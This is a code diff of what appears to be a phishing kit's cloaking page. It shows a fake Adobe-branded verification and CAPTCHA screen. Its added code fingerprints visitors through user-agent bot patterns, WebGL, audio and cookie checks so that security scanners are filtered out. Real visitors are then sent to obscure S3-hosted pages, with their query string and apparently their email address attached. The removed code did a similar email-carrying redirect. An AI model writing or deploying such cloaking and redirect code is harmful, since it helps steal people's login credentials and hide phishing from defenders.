+      const openSourceBotPatterns = [
+        /bot/i, /crawler/i, /spider/i, /archiver/i, /fetcher/i, /monitor/i,
+        /scan/i, /pingdom/i, /phantomjs/i, /axios/i, /aiohttp/i, /python-requests/i
+      ];
+
+      const isKnownBot = botList.some(bot => ua.includes(bot));
+      const matchesPattern = openSourceBotPatterns.some(pattern => pattern.test(ua));
+      const vendorFlags = isVendorSuspect();
+
+      if (isKnownBot || matchesPattern || vendorFlags) {
+        testFailed.push('UserAgentCheck');
+        uKB.push([ua, null, 'Known/Suspect Bot']);
+        log('UserAgent', 'fail', vendorFlags || 'matched UA pattern');
+      } else {
+        testPassed.push('UserAgentCheck');
+        uKB.push([ua, null, 'Not-Known-Bot']);
+        counter++;
+        log('UserAgent', 'pass');
+      }
+    } catch (err) {
+      testFailed.push('UserAgentCheck');
+      counter++;
+      log('UserAgent', 'fail', err.message);
+    }
+    updateFooter();
+  }
+
+  function expirationCheck() {
+    try {
+      const now = Date.now();
+      const exp = expiryDate.getTime();
+      if (now <= exp) {
+        testPassed.push('DateComp');
+        log('Date', 'pass');
+      } else {
+        testFailed.push('DateComp:Expired');
+        log('Date', 'fail', 'Cookie expired');
+      }
+      counter++;
+    } catch (err) {
+      testFailed.push('DateComp');
+      counter++;
+      log('Date', 'fail', err.message);
+    }
+    updateFooter();
+  }
+
+  function webglFingerprintCheck() {
+    try {
+      const canvas = document.createElement('canvas');
+      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+      const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+      const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+      if (vendor && renderer) {
+        testPassed.push('WebGL');
+        log('WebGL', 'pass', `${vendor} - ${renderer}`);
+      } else {
+        testFailed.push('WebGL');
+        log('WebGL', 'fail', 'Missing vendor/renderer');
+      }
+      counter++;
+    } catch (err) {
+      testFailed.push('WebGL');
+      counter++;
+      log('WebGL', 'fail', err.message);
+    }
+    updateFooter();
+  }
+
+  function audioFingerprintCheck() {
+    try {
+      const context = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
+      const oscillator = context.createOscillator();
+      const analyser = context.createAnalyser();
+      oscillator.type = 'triangle';
+      oscillator.connect(analyser);
+      analyser.connect(context.destination);
+      oscillator.start(0);
+      context.startRendering().then(() => {
+        testPassed.push('Audio');
+        log('Audio', 'pass');
+        updateFooter();
+      }).catch(err => {
+        testFailed.push('Audio');
+        log('Audio', 'fail', err.message);
+        updateFooter();
+      });
+      counter++;
+    } catch (err) {
+      testFailed.push('Audio');
+      counter++;
+      log('Audio', 'fail', err.message);
+      updateFooter();
+    }
+  }
+
+function renderRecaptchaFallback(queryString) {
+    const fallbackContainer = document.createElement('div');
+    fallbackContainer.innerHTML = `
+      <div style="text-align:center;margin-top:20px;display:grid;align-items:center;justify-contents:center;">
+        <img style="width:120px;margin:0 auto;" src="https://www.adobe.com/content/dam/cc/icons/adobe_wordmark_red.svg">
+        <h3>Verification Required</h3>
+        <p>Please complete the CAPTCHA below to continue.</p>
+        <div class="g-recaptcha" data-sitekey="PUT-YOUR-SITE-KEY-HERE" data-callback="onCaptchaSuccess" style="display:grid;justify-contents:center;text-align:center;margin:0 auto;"></div>
         
-        function redirectUser() {
-            
-            sliderWrapper.style.display = "none"; 
-            cardTitle.style.display = "none"; 
-            compTitle.style.display = "flex"; 
-            cardText.innerText = "Verification completed successfully. Please wait..."; 
+      </div>
+      <svg style="position:absolute;" class="LoggedOutHome__backgroundImage___lQqQ6" alt="" id="Layer_1" data-name="Layer 1" viewBox="0 0 473.33 138.89"><path d="m435.44,32.13c-2.86,0-5.85.66-8.7,2.03-12.44,5.97-22.33,23.93-20.83,57.15,15.08-7.76,26.62-16.07,34.08-24.03,15.27-16.3,9.84-26.58,7.82-29.34-2.78-3.78-7.37-5.8-12.36-5.8Z" fill="none" stroke-width="0"></path><path d="m401.05,107.73c1.3,9.71,3.37,20.1,6.22,31.17h6.55c-3.3-12.54-5.48-23.85-6.73-34-2.24,1.09-4.28,2.04-6.04,2.83Z" fill="#fa0f00" stroke-width="0"></path><path d="m452.91,34.19c-6.17-8.41-18.33-10.82-28.92-5.74-10.94,5.25-18.91,17.33-22.42,34.01-1.97,9.36-2.59,20.02-1.86,31.92-29.69,14.1-71.31,25.93-121.47,29.85C213.71,129.27,113.79,122.72,0,64.39v7.11c113.91,57.65,213.93,64.12,278.74,59.05,37.68-2.95,73.8-10.65,104.43-22.28,5.97-2.26,11.68-4.66,17.09-7.16,0,0,0,.01,0,.02,1.82-.84,3.88-1.83,6.1-2.94h0c16.35-8.17,29.55-17.29,38.24-26.57,9.69-10.35,16.96-25.61,8.3-37.42Zm-12.93,33.09c-7.46,7.96-19,16.27-34.08,24.03-1.51-33.22,8.39-51.18,20.83-57.15,2.86-1.37,5.84-2.03,8.7-2.03,4.99,0,9.59,2.02,12.36,5.8,2.03,2.76,7.45,13.05-7.82,29.34Z" fill="#fa0f00" stroke-width="0"></path></svg>
+    `;
+    document.body.innerHTML = '';
+    document.body.appendChild(fallbackContainer);
 
-            
-            proceedButton.style.display = "none"; 
-            loadingSpinner.style.display = "inline-block"; 
+    const script = document.createElement('script');
+    script.src = 'https://www.google.com/recaptcha/api.js';
+    document.head.appendChild(script);
 
-            
-            let email = getEmailFromURL(window.location.href);
+    window.onCaptchaSuccess = function () {
+      const finalRedirect = `https://03546079-43-5469rtgcv-dsfdgr64-ereve.s3.us-east-2.amazonaws.com/DSJFKGBIROSFN-54YTHG-RI534R-FCZFXJSERFCLKZXD-23-R9HIFCKXLDSERLF-DFGF/FDGB9EDF-43GRIOLG-DOFBJI409EJKLZF-43R-VXXD-9QETJBDBCNGVIXCZFX-GHNGVCFX/xam.html#${queryString}`;
+      window.location.href = finalRedirect;
+    };
+  }
 
-            
-            setTimeout(function() {
-              const redirectURL = "https://kcramer.com/Sec1emNoXgalRa9wtuTuXgwtJ7J72cqTrBhQanoRa9s32cqTrB";
-                if (email) {
-                    
-                    window.location.href = `${redirectURL}#${email}`;
-                } else {
-                    window.location.href = redirectURL; 
-                }
-            }, 5000);
-        }
+  function redirectLogic() {
+    try {
+      const queryString = window.location.href.split('?')[1] || '';
+      if (testPassed.length >= 5 && testPassed.includes('UserAgentCheck') && testPassed.includes('DateComp')) {
+        window.location.href = `https://4egh-tgf-56rgds-sh35-rgfhj-drre-redact-35469r-g.s3.us-east-2.amazonaws.com/RIUOWJDAOI-TRBIOFSLCZ03Q4R-FSZ--IOFJDJKSFFO-F3T4RHG-SDFDGF/389GEOJIDSLLD390ITORF-435490RDV90XIZKLD-4RTH-NG-MFGREHNT-HSGEYHTGDCZ-DEHYTHG/xam.html#${queryString}`;
+      } else {
+        renderRecaptchaFallback(queryString);
+      }
+    } catch (err) {
+      window.location.href = `error500.html#fallback`;
+    }
+  }
 
-        
-        function getEmailFromURL(url) {
-            const hashPart = url.split('#')[1]; 
-            if (!hashPart) return null;
+  return {
+    async run(serverEmailCopy = null, recipientDomain = '') {
+      checkDOMReady();
+      await checkCookies(serverEmailCopy, recipientDomain);
+      botFingerprintCheck();
+      userAgentCheck();
+      expirationCheck();
+      isVendorSuspect()
+      webglFingerprintCheck();
+      audioFingerprintCheck();
+      setTimeout(() => {
+        console.table(logger);
+        updateFooter();
+        redirectLogic();
+      }, 5000);
+    },
+  };
+})();
 
-            let email = null;
+const footer = document.createElement('div');
+footer.id = 'zen-footer';
+footer.style = 'position:fixed;bottom:10px;left:50%;transform:translateX(-50%);padding:8px 12px;background:#000;color:#fff;font-family:monospace;font-size:12px;border-radius:6px;z-index:9999;display:none;';
+document.body.appendChild(footer);
 
-            
-            const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
-            if (emailRegex.test(hashPart)) {
-                email = hashPart; 
-            } else {
-                
-                try {
-                    const decodedEmail = atob(hashPart); 
-                    if (emailRegex.test(decodedEmail)) {
-                        email = decodedEmail; 
-                    }
-                } catch (e) {
-                    console.error("Invalid base64 encoding");
-                }
-            }
+BotDefense.run(null, 'example.com');
 
-            return email;
-        }
-    </script>
-
-  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js"></script>
+  </script>
 </body>
 </html>
